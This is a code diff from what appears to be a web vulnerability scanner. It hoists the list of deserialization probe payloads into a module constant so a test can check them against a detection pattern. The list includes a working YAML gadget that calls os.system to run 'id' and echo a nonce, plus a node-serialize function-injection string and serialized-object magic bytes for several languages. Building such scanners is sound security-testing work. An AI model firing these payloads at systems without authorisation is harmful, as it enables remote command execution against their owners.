@@ -2038,6 +2038,29 @@ _DESER_ERRORS = re.compile(
 )
 
 
+# Hoisted out of `probe_deserialize` so a test can grade these against
+# `proof.SERIALIZED_RE` mechanically. While they were a local list, the only
+# question anything asked was whether SOME payload reached the ceiling
+# against the lab - and the lab executes the yaml one - so five payloads
+# whose magic the pattern could not see went unnoticed through two sweeps.
+# `{nonce}` is substituted per call: the gadget carries `id; echo <nonce>`
+# for the same reason probe_cmdi does, because the class wants the identity
+# line AND a token tied to THIS probe, so output a page happens to contain
+# cannot stand in for execution.
+_DESER_PAYLOADS = (
+    ("java-b64", "rO0ABXQABHRlc3Q="),
+    ("php-object", 'O:8:"stdClass":0:{}'),
+    ("php-array", 'a:1:{s:1:"a";s:1:"b";}'),
+    ("python-pickle", "c__builtin__\nset\n"),
+    ("python-pickle-b64", "gASVQg=="),   # \x80\x04\x95 - proto-4 magic
+    ("node-serialize", '{"x":"_$$ND_FUNC$$_function(){return 1}()"}'),
+    ("yaml-python", "!!python/object/apply:os.system ['id; echo {nonce}']"),
+    ("dotnet-psobject", '{"$type":"System.Object"}'),
+    ("ruby-marshal-b64", "BAhvOg=="),    # \x04\x08o: - Marshal magic
+    ("ruby-marshal-raw", "\x04\x08o:"),
+)
+
+
 def probe_deserialize(ctx: Context, url: str, param: str,
                       method: str = "GET", data: str | None = None) -> dict:
     """Deserialization surface check: baseline then magic-bytes payloads
@@ -2052,23 +2075,8 @@ def probe_deserialize(ctx: Context, url: str, param: str,
     base = _send(ctx, url, param, "argus-plain", method, data,
                  tool="probe_deserialize", note="baseline")
     base_err = _DESER_ERRORS.search(base.get("body") or "")
-    payloads = [
-        ("java-b64", "rO0ABXQABHRlc3Q="),
-        ("php-object", 'O:8:"stdClass":0:{}'),
-        ("php-array", 'a:1:{s:1:"a";s:1:"b";}'),
-        ("python-pickle", "c__builtin__\nset\n"),
-        ("python-pickle-b64", "gASVQg=="),  # \x80\x04\x95 - proto-4 magic
-        ("node-serialize", '{"x":"_$$ND_FUNC$$_function(){return 1}()"}'),
-        # the gadget carries `id; echo <nonce>` for the same reason
-        # probe_cmdi does: the class wants the identity line AND a token
-        # tied to THIS probe, so output a page happens to contain cannot
-        # stand in for execution
-        ("yaml-python",
-         "!!python/object/apply:os.system ['id; echo " + nonce + "']"),
-        ("dotnet-psobject", '{"$type":"System.Object"}'),
-        ("ruby-marshal-b64", "BAhvOg=="),   # \x04\x08o: - Marshal magic
-        ("ruby-marshal-raw", "\x04\x08o:"),
-    ]
+    payloads = [(name, body.replace("{nonce}", nonce))
+                for name, body in _DESER_PAYLOADS]
     hits = []
     for name, pl in payloads:
         r = _send(ctx, url, param, pl, method, data,
